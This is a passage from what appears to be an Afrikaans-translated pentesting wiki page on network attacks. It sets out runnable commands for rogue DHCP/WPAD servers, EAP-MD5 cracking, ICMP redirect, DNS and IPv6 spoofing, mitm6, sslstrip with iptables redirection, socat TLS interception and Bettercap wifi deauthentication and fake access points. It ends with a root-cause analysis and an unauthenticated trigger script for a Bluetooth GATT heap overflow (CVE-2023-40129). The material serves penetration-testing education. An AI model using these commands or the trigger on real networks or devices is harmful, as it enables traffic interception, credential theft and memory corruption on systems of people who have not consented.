Deur hierdie opsies korrek te gebruik, kan 'n kwaadwillige DHCP-bediener gevestig word om netwerkverkeer effektief te onderskep.
```python
# Example to start a rogue DHCP server with specified options
!python /usr/share/responder/DHCP.py -i 10.0.0.100 -d example.org -r 10.0.0.1 -p 10.0.0.100 -s 10.0.0.1 -n 255.255.255.0 -I eth1 -w "http://10.0.0.100/wpad.dat" -S -R
```
### **EAP Aanvalle**

Hier is 'n paar van die aanvalstaktieke wat teen 802.1X implementasies gebruik kan word:

- Aktiewe brute-force password grinding via EAP
- Aanvalle op die RADIUS server met misvormde EAP content _\*\*_(exploits)
- EAP boodskap vasvang en offline password cracking (EAP-MD5 en PEAP)
- Dwing EAP-MD5 authentication om TLS sertifikaatvalidasie te omseil
- Inspuiting van kwaadwillige netwerkverkeer by authenticating met 'n hub of soortgelyks

As die attacker tussen die victim en die authentication server is, kan hy, indien nodig, die authentication-protokol degradeer na EAP-MD5 en die authentication-poging vasvang. Daarna kan hy dit brute-force deur gebruik te maak van:
```
eapmd5pass –r pcap.dump –w /usr/share/wordlist/sqlmap.txt
```
### FHRP (GLBP & HSRP) Aanvalle <a href="#id-6196" id="id-6196"></a>

**FHRP** (Eerste Hop Redundansieprotokol) is 'n klas netwerkprotokolle ontwerp om **'n warm redundante roeterstelsel te skep**. Met FHRP kan fisiese routers in 'n enkele logiese toestel gekombineer word, wat foutverdraagsaamheid verhoog en help om die las te versprei.

**Cisco Systems engineers het twee FHRP-protokolle ontwikkel, GLBP en HSRP.**


{{#ref}}
glbp-and-hsrp-attacks.md
{{#endref}}

### RIP

Daar bestaan drie weergawes van die Routing Information Protocol (RIP): RIP, RIPv2 en RIPng. RIP en RIPv2 stuur datagramme na eweknieë via UDP-poort 520, terwyl RIPng datagramme via IPv6-multicast na UDP-poort 521 uitsaai. RIPv2 het ondersteuning vir MD5-verifikasie ingevoer. RIPng het daarenteen nie inheemse verifikasie nie; dit staan eerder op opsionele IPsec AH- en ESP-koppe binne IPv6.

- **RIP and RIPv2:** Kommunikasie geskied deur UDP-datagramme op poort 520.
- **RIPng:** Gebruik UDP-poort 521 om datagramme via IPv6-multicast uit te saai.

Let wel dat RIPv2 MD5-verifikasie ondersteun, terwyl RIPng nie inheemse verifikasie insluit nie en op IPsec AH- en ESP-koppe in IPv6 staatmaak.

### EIGRP Aanvalle

**EIGRP (Enhanced Interior Gateway Routing Protocol)** is 'n dinamiese roeteringsprotokol. **Dit is 'n distance-vector-protokol.** As daar **geen verifikasie** en konfigurasie van passiewe koppelvlakke is nie, kan 'n **indringer** met EIGRP-roetering inmeng en **roeteringstabelvergiftiging** veroorsaak. Verder is die EIGRP-netwerk (met ander woorde die autonome stelsel) **plat en het geen segmentering in sones nie**. As 'n **aanvaller 'n roete inprop**, is dit waarskynlik dat hierdie roete deur die hele autonome EIGRP-stelsel sal **versprei**.

Om 'n EIGRP-stelsel aan te val vereis **die vestiging van 'n buurrelasie met 'n geldige EIGRP-router**, wat baie moontlikhede oopmaak, van basiese verkenning tot verskeie inproppe.

[**FRRouting**](https://frrouting.org/) laat jou toe om 'n virtuele router te implementeer wat BGP, OSPF, EIGRP, RIP en ander protokolle ondersteun. Alles wat jy hoef te doen is dit op jou aanvaller se stelsel te ontplooi en jy kan eintlik voorgee om 'n geldige router in die roeteringsdomein te wees.


{{#ref}}
eigrp-attacks.md
{{#endref}}

[**Coly**](https://code.google.com/p/coly/) het vermoëns om EIGRP-uitsendings te onderskep. Dit laat ook die inprop van pakkette toe, wat gebruik kan word om roeteringskonfigurasies te verander.

### OSPF

In die Open Shortest Path First (OSPF)-protokol word **MD5-verifikasie algemeen gebruik om veilige kommunikasie tussen routers te verseker**. Hierdie sekuriteitsmaatreël kan egter gekompromitteer word met gereedskap soos Loki en John the Ripper. Hierdie gereedskap kan MD5-hashes vang en kraak, wat die verifikasiesleutel aan die lig bring. Sodra hierdie sleutel bekom is, kan dit gebruik word om nuwe roeteringsinligting in te voer. Om die roeteparameters te konfigureer en die gekompromitteerde sleutel te stel, word onderskeidelik die _Injection_- en _Connection_-oortjies gebruik.

- **Vang en kraak van MD5-hashes:** Gereedskap soos Loki en John the Ripper word hiervoor gebruik.
- **Konfigureer roeteparameters:** Dit gebeur deur die _Injection_-oortjie.
- **Stel die gekompromitteerde sleutel:** Die sleutel word onder die _Connection_-oortjie gekonfigureer.

### Other Generic Tools & Sources

- [**Above**](https://github.com/c4s73r/Above): Gereedskap om netwerkverkeer te skandeer en kwesbaarhede te vind
- Jy kan meer **inligting oor netwerk-aanvalle** [**hier**](https://github.com/Sab0tag3d/MITM-cheatsheet) vind.

## **Spoofing**

Die aanvaller stel al die netwerkparameters (GW, IP, DNS) van die nuwe lid van die netwerk op deur vals DHCP-antwoorde te stuur.
```bash
Ettercap
yersinia dhcp -attack 2 #More parameters are needed
```
### ARP Spoofing

Kyk na die [previous section](#arp-spoofing).

### ICMPRedirect

ICMP Redirect bestaan uit die stuur van 'n ICMP packet type 1 code 5 wat aandui dat die attacker die beste manier is om 'n IP te bereik. Wanneer die victim die IP wil kontak, sal die victim die packet deur die attacker stuur.
```bash
Ettercap
icmp_redirect
hping3 [VICTIM IP ADDRESS] -C 5 -K 1 -a [VICTIM DEFAULT GW IP ADDRESS] --icmp-gw [ATTACKER IP ADDRESS] --icmp-ipdst [DST IP ADDRESS] --icmp-ipsrc [VICTIM IP ADDRESS] #Send icmp to [1] form [2], route to [3] packets sent to [4] from [5]
```
### DNS Spoofing

Die aanvaller sal sommige (of al) van die domeine oplos wat die slagoffer versoek.
```bash
set dns.spoof.hosts ./dns.spoof.hosts; dns.spoof on
```
**Konfigureer jou eie DNS met dnsmasq**
```bash
apt-get install dnsmasq
echo "addn-hosts=dnsmasq.hosts" > dnsmasq.conf
echo "127.0.0.1   domain.example.com" > dnsmasq.hosts
sudo dnsmasq -C dnsmasq.conf --no-daemon
dig @localhost domain.example.com # Test the configured DNS
```
### Plaaslike Gateways

Daar bestaan dikwels meerdere roetes na stelsels en netwerke. Sodra jy 'n lys MAC-adresse binne die plaaslike netwerk saamgestel het, gebruik _gateway-finder.py_ om gashere te identifiseer wat IPv4 forwarding ondersteun.

<details>
<summary>gateway-finder gebruiksvoorbeeld</summary>
```bash
root@kali:~# git clone https://github.com/pentestmonkey/gateway-finder.git
root@kali:~# cd gateway-finder/
root@kali:~# arp-scan -l | tee hosts.txt
Interface: eth0, datalink type: EN10MB (Ethernet)
Starting arp-scan 1.6 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/)
10.0.0.100     00:13:72:09:ad:76       Dell Inc.
10.0.0.200     00:90:27:43:c0:57       INTEL CORPORATION
10.0.0.254     00:08:74:c0:40:ce       Dell Computer Corp.

root@kali:~/gateway-finder# ./gateway-finder.py -f hosts.txt -i 209.85.227.99
gateway-finder v1.0 http://pentestmonkey.net/tools/gateway-finder
[+] Using interface eth0 (-I to change)
[+] Found 3 MAC addresses in hosts.txt
[+] We can ping 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
[+] We can reach TCP port 80 on 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
```
</details>


### [Spoofing LLMNR, NBT-NS, and mDNS](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

Vir plaaslike gasheer-oplossing wanneer DNS-ondersoeke onsuksesvol is, vertrou Microsoft-stelsels op **Link-Local Multicast Name Resolution (LLMNR)** en die **NetBIOS Name Service (NBT-NS)**. Net so gebruik **Apple Bonjour** en **Linux zero-configuration** implementasies **Multicast DNS (mDNS)** om stelsels binne 'n netwerk te ontdek. As gevolg van die nie-geauthentiseerde aard van hierdie protokolle en hul werking oor UDP wat boodskappe uitsaai, kan hulle uitgebuit word deur aanvallers wat gebruikers na kwaadwillige dienste wil herlei.

Jy kan dienste wat deur gasheer gesoek word naboots deur Responder te gebruik om vals antwoorde te stuur.\  
Read here more information about [how to Impersonate services with Responder](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [Spoofing WPAD](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

Blaaiers gebruik gewoonlik die **Web Proxy Auto-Discovery (WPAD) protocol to automatically acquire proxy settings**. Dit behels die haal van konfigurasiedetails vanaf 'n bediener, spesifiek deur 'n URL soos "http://wpad.example.org/wpad.dat". Die ontdekking van hierdie bediener deur kliënte kan op verskeie maniere plaasvind:

- Deur **DHCP**, waar die ontdekking gefasiliteer word deur 'n spesiale kode 252-invoer.
- Deur **DNS**, wat behels dat 'n gasheernaam gemerk _wpad_ binne die plaaslike domein gesoek word.
- Via **Microsoft LLMNR and NBT-NS**, wat terugvalmeganismes is wat in gevalle gebruik word waar DNS-opsoeke nie slaag nie.

Die tool Responder maak hierby gebruik van die protokol deur op te tree as 'n **malicious WPAD server**. Dit gebruik DHCP, DNS, LLMNR, en NBT-NS om kliënte te mislei om daaraan te verbind. To dive deeper into how services can be impersonated using Responder [check this](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [Spoofing SSDP and UPnP devices](spoofing-ssdp-and-upnp-devices.md)

Jy kan verskillende dienste in die netwerk aanbied om 'n gebruiker te probeer flous om plain-text credentials in te voer. **More information about this attack in** [**Spoofing SSDP and UPnP Devices**](spoofing-ssdp-and-upnp-devices.md)**.**

### IPv6 Neighbor Spoofing

Hierdie aanval is baie soortgelyk aan ARP Spoofing, maar in die IPv6-omgewing. Jy kan die slagoffer laat dink dat die IPv6 van die GW die MAC van die aanvaller het.
```bash
sudo parasite6 -l eth0 # This option will respond to every requests spoofing the address that was requested
sudo fake_advertise6 -r -w 2 eth0 <Router_IPv6> #This option will send the Neighbor Advertisement packet every 2 seconds
```
### IPv6 Router Advertisement Spoofing/Flooding

Sommige OS stel standaard die gateway op grond van die RA-pakkette wat op die netwerk gestuur word. Om die aanvaller as IPv6 router te verklaar, kan jy gebruik:
```bash
sysctl -w net.ipv6.conf.all.forwarding=1 4
ip route add default via <ROUTER_IPv6> dev wlan0
fake_router6 wlan0 fe80::01/16
```
### IPv6 DHCP spoofing

Standaard probeer sommige OS die DNS te konfigureer deur 'n DHCPv6-pakket op die netwerk te lees. Dan kan 'n aanvaller 'n DHCPv6-pakket stuur om homself as DNS te konfigureer. Die DHCP voorsien ook 'n IPv6 aan die slagoffer.
```bash
dhcp6.spoof on
dhcp6.spoof.domains <list of domains>

mitm6
```
### HTTP (fake page and JS code injection)

## Internet Attacks

### sslStrip

In wese werk hierdie aanval so: indien die **user** probeer om 'n **HTTP**-bladsy te **access** wat na die **HTTPS**-weergawe **redirecting**. **sslStrip** sal **maintain** 'n **HTTP connection with** die **client and** 'n **HTTPS connection with** die **server**, sodat dit die verbinding in **plain text** kan **sniff**.
```bash
apt-get install sslstrip
sslstrip -w /tmp/sslstrip.log --all - l 10000 -f -k
#iptables --flush
#iptables --flush -t nat
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
iptables -A INPUT -p tcp --destination-port 10000 -j ACCEPT
```
Meer inligting [hier](https://www.blackhat.com/presentations/bh-dc-09/Marlinspike/BlackHat-DC-09-Marlinspike-Defeating-SSL.pdf).

### sslStrip+ and dns2proxy vir omseiling van HSTS

Die **verskil** tussen **sslStrip+ and dns2proxy** teen **sslStrip** is dat hulle byvoorbeeld _**www.facebook.com**_ **sal herlei na** _**wwww.facebook.com**_ (let op die **ekstra** "**w**") en die **adres van hierdie domein as die aanvaller se IP** sal instel. Op hierdie manier sal die **kliënt** **koppel** aan _**wwww.facebook.com**_ **(die aanvaller)** maar agter die skerms sal **sslstrip+** die **werklike verbinding** via https met **www.facebook.com** **onderhou**.

Die **doel** van hierdie tegniek is om **HSTS te omseil** omdat _**wwww**.facebook.com_ **nie** in die **kas** van die blaaier gestoor sal word nie, sodat die blaaier mislei sal word om **facebook-verifikasie oor HTTP** uit te voer.\
Let daarop dat om hierdie aanval uit te voer die slagoffer aanvanklik moet probeer toegang kry tot [http://www.faceook.com](http://www.faceook.com) en nie https nie. Dit kan gedoen word deur die skakels binne 'n http-bladsy te wysig.

Meer inligting [hier](https://www.bettercap.org/legacy/#hsts-bypass), [hier](https://www.slideshare.net/Fatuo__/offensive-exploiting-dns-servers-changes-blackhat-asia-2014) en [hier](https://security.stackexchange.com/questions/91092/how-does-bypassing-hsts-with-sslstrip-work-exactly).

**sslStrip or sslStrip+ doesn't work anymore. This is because there are HSTS rules presaved in the browsers, so even if it's the first time that a user access an "important" domain he will access it via HTTPS. Also, notice that the presaved rules and other generated rules can use the flag** [**`includeSubdomains`**](https://hstspreload.appspot.com) **so the** _**wwww.facebook.com**_ **example from before won't work anymore as** _**facebook.com**_ **uses HSTS with `includeSubdomains`.**

TODO: easy-creds, evilgrade, metasploit, factory

## TCP luister op poort
```bash
sudo nc -l -p 80
socat TCP4-LISTEN:80,fork,reuseaddr -
```
## TCP + SSL luister op poort

#### Genereer sleutels en 'n self-ondertekende sertifikaat
```
FILENAME=server
# Generate a public/private key pair:
openssl genrsa -out $FILENAME.key 1024
# Generate a self signed certificate:
openssl req -new -key $FILENAME.key -x509 -sha256 -days 3653 -out $FILENAME.crt
# Generate the PEM file by just appending the key and certificate files:
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
```
#### Luister met sertifikaat
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0 -
```
#### Luister met sertifikaat en herlei na die gashere
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0  openssl-connect:[SERVER]:[PORT],verify=0
```
Soms, as die client kontroleer dat die CA geldig is, kan jy **bedien 'n certificate van 'n ander hostname wat deur 'n CA geteken is**.\
Nog 'n interessante toets, is om 'n c**ertificate van die aangevraagde hostname maar self-signed**.

Andere dinge om te toets is om te probeer die certificate te teken met 'n geldige certificate wat nie 'n geldige CA is nie. Of om die geldige public key te gebruik, te dwing om 'n algoritme soos diffie hellman te gebruik (een wat niks hoef te decrypt met die werklike private key nie) en wanneer die client 'n probe van die werklike private key versoek (soos 'n hash) stuur 'n vals probe en verwag dat die client dit nie kontroleer nie.

## Bettercap

<details>
<summary>Algemene Bettercap-kommando's</summary>
```bash
# Events
events.stream off #Stop showing events
events.show #Show all events
events.show 5 #Show latests 5 events
events.clear

# Ticker (loop of commands)
set ticker.period 5; set ticker.commands "wifi.deauth DE:AD:BE:EF:DE:AD"; ticker on

# Caplets
caplets.show
caplets.update

# Wifi
wifi.recon on
wifi.deauth BSSID
wifi.show
# Fake wifi
set wifi.ap.ssid Banana
set wifi.ap.bssid DE:AD:BE:EF:DE:AD
set wifi.ap.channel 5
set wifi.ap.encryption false #If true, WPA2
wifi.recon on; wifi.ap
```
</details>


### Aktiewe Ontdekkingsnotas

Neem in ag dat wanneer 'n UDP-pakket aan 'n toestel gestuur word wat nie die versoekte poort het nie, 'n ICMP (Port Unreachable) gestuur sal word.

### **ARP discover**

ARP-pakkette word gebruik om te ontdek watter IP's binne die netwerk gebruik word. Die rekenaar moet 'n versoek stuur vir elke moontlike IP-adres en slegs diegene wat in gebruik is sal antwoord.

### **mDNS (multicast DNS)**

Bettercap stuur 'n MDNS-versoek (elke X ms) wat vra vir **\_services\_.dns-sd.\_udp.local**. Masjiene wat hierdie pakket sien, antwoord gewoonlik op die versoek. Daarna soek dit slegs na masjiene wat op "services" antwoord.

**Gereedskap**

- Avahi-browser (--all)
- Bettercap (net.probe.mdns)
- Responder

### **NBNS (NetBios Name Server)**

Bettercap stuur broadcasts na poort 137/UDP wat vra vir die naam "CKAAAAAAAAAAAAAAAAAAAAAAAAAAA".

### **SSDP (Simple Service Discovery Protocol)**

Bettercap stuur SSDP-broadcasts en soek na alle soorte dienste (UDP Poort 1900).

### **WSD (Web Service Discovery)**

Bettercap stuur WSD-broadcasts wat na dienste soek (UDP Poort 3702).


## Bluetooth (L2CAP/ATT/GATT) Attacks

- Android Fluoride openbaar dienste oor L2CAP PSMs (e.g., SDP 0x0001, RFCOMM 0x0003, BNEP 0x000F, AVCTP 0x0017/0x001B, AVDTP 0x0019, ATT/GATT 0x001F). Services register via:
```c
uint16_t L2CA_Register2(uint16_t psm, const tL2CAP_APPL_INFO& p_cb_info,
bool enable_snoop, tL2CAP_ERTM_INFO* p_ertm_info,
uint16_t my_mtu, uint16_t required_remote_mtu,
uint16_t sec_level);
```
- BlueBlue framework maak Scapy-based L2CAP/ATT crafting moontlik (built on BlueBorne l2cap_infra). Voorbeeld:
```python
acl  = ACLConnection(src_bdaddr, dst_bdaddr, auth_mode='justworks')
gatt = acl.l2cap_connect(psm=PSM_ATT, mtu=672)
gatt.send_frag(p8(GATT_READ)+p16(1234))
print(gatt.recv())
```
- CVE-2023-40129 (Fluoride GATT): integer underflow in Read Multiple Variable response builder kan 'n ~64KB heap overflow veroorsaak wanneer MTU 'n variable-length element afkap maar die +2 length field nie in ag geneem word nie.

<details>
<summary>Hoof oorsaak (GATT Read Multiple Variable)</summary>
```c
static void build_read_multi_rsp(tGATT_SR_CMD* p_cmd, uint16_t mtu) {
uint16_t ii, total_len, len; uint8_t* p; bool is_overflow=false;
len = sizeof(BT_HDR) + L2CAP_MIN_OFFSET + mtu;
BT_HDR* p_buf = (BT_HDR*)osi_calloc(len); p_buf->offset=L2CAP_MIN_OFFSET;
p = (uint8_t*)(p_buf + 1) + p_buf->offset; *p++ = GATT_RSP_READ_MULTI_VAR;
p_buf->len=1;
for (ii=0; ii<p_cmd->multi_req.num_handles; ii++) {
tGATTS_RSP* p_rsp = ...; // dequeued
if (p_rsp) {
total_len = (p_buf->len + p_rsp->attr_value.len);
if (p_cmd->multi_req.variable_len) total_len += 2;
if (total_len > mtu) {
len = p_rsp->attr_value.len - (total_len - mtu); // BUG: ignores +2
is_overflow = true;
} else { len = p_rsp->attr_value.len; }
if (p_cmd->multi_req.variable_len) { UINT16_TO_STREAM(p, len); p_buf->len += 2; }
memcpy(p, p_rsp->attr_value.value, len); // heap overflow
if (!is_overflow) p += len; p_buf->len += len; if (is_overflow) break;
}
}
}
```
- Op veranderlike-lengte inskrywings trek die overflow path slegs (total_len - mtu) af, en ignoreer die +2 length field, dus len underflows (bv. 0xFFFE) en memcpy skryf ~64KB verby die einde van die buffer.
</details>

- Minimale nie-geauthentiseerde trigger (klein MTU dwing underflow op die 4de attribute):
```python
# GATT_REQ_READ_MULTI_VAR (0x20), MTU=55
acl  = ACLConnection(interface, bdaddr)
gatt = acl.l2cap_connect(psm=PSM_ATT, mtu=55)
pkt  = b'\x20'  # opcode
pkt += p16(9); pkt += p16(9); pkt += p16(9); pkt += p16(9)
gatt.send(pkt)
# On 4th insert: p_buf->len=55 (1 + 3*(16+2)), total_len=73 -> len=16-(73-55)=-2 -> ~64KB overwrite
```
### Telekommunikasie / Mobiele-kern (GTP) Exploitation


{{#ref}}
telecom-network-exploitation.md
{{#endref}}

## Verwysings

- [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)
- **Network Security Assessment: Know Your Network (3rd edition)**
- **Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things. By Fotios Chantzis, Ioannis Stais, Paulino Calderon, Evangelos Deirmentzoglou, Beau Wood**
- [https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@cursedpkt/cisco-night-pentesting-cisco-networks-like-a-devil-f4032eb437b9)
- [Paint it blue: Attacking the bluetooth stack (Synacktiv)](https://www.synacktiv.com/en/publications/paint-it-blue-attacking-the-bluetooth-stack)
- [BlueBorne L2CAP testing infra (l2cap_infra)](https://github.com/ArmisSecurity/blueborne/tree/master/l2cap_infra)



{{#include ../../banners/hacktricks-training.md}}
